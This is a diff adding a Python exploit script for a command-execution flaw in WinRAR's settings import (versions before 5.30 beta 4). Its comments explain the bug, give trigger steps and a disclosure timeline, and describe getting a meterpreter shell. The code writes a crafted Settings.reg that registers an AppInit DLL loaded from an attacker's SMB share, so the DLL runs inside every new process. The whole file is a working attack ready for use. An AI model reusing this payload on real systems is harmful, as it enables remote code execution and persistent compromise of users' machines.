@@ -1,0 +1,54 @@
+#!/usr/bin/python -w
+# Title : WinRar Settings Import Command Execution
+# Date : 02/10/2015
+# Author : R-73eN
+# Tested on : Windows 7 Ultimate
+# Vulnerable Versions : Winrar < 5.30 beta 4
+# The vulnerability exists in the "Import Settings From File" function.
+# Since Settings file of Winrar are saved as a registry file and WinRar executes
+# it in an automatic way without checking if it is writing to the Registry keys 
+# used by winrar, we can create a specially crafted settings file and we can 
+# overwrite registry keys.
+# Since we have access to registry there are various ways we could use this to 
+# get code execution such as defining "RUN" keys or creating new services etc 
+# However the best way to get code execution is using AppInit DLLs
+# AppInit DLLs are DLLs that are loaded into any process when it starts. 
+# In this case, we can specify a meterpreter DLL payload using a UNC path on
+# an SMB server we control and then next time a new process starts we will 
+# get a shell.
+# Read more about AppInit Dlls : https://support.microsoft.com/en-us/kb/197571
+#
+# Triggering the vulnerability
+# 1) Run this python script.
+# 2) Open WinRar
+# 3) Click Options
+# 4) Click Import/Export
+# 5) Import Settings from file
+# 6) Select the Specially crafted Settings.reg file
+#
+# Disclosure Timeline:
+# 01/10/2015 - Vendor Contacted POC provided
+# 02/10/2015 - Vendor released patch in WinRAR 5.30 beta 4 on  to verify
+# presence of [HKEY_CURRENT_USER\Software\WinRAR] or
+# [HKEY_CURRENT_USER\Software\WinRAR\
+#
+#
+
+banner = ""
+banner +="  ___        __        ____                 _    _  \n" 
+banner +=" |_ _|_ __  / _| ___  / ___| ___ _ __      / \  | |    \n"
+banner +="  | || '_ \| |_ / _ \| |  _ / _ \ '_ \    / _ \ | |    \n"
+banner +="  | || | | |  _| (_) | |_| |  __/ | | |  / ___ \| |___ \n"
+banner +=" |___|_| |_|_|  \___/ \____|\___|_| |_| /_/   \_\_____|\n\n"
+print banner
+print "[+] WinRar Settings Import Command Execution [+]\n"
+dll = raw_input("[+] Enter dll location (smb) : ")
+dll = dll.replace("\\","\\\\")
+print "[+] Writing Contet To Settings.reg [+]"
+evil = 'Windows Registry Editor Version 5.00\n\n[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]\n"AppInit_DLLs"="' + dll + '"\n"LoadAppInit_DLLs"=dword:00000001\n'
+print evil
+f = open("Settings.reg","w")
+f.write(evil)
+f.close()
+print "[+] Settings.reg created successfully [+]"
+print "\n https://www.infogen.al/ \n"
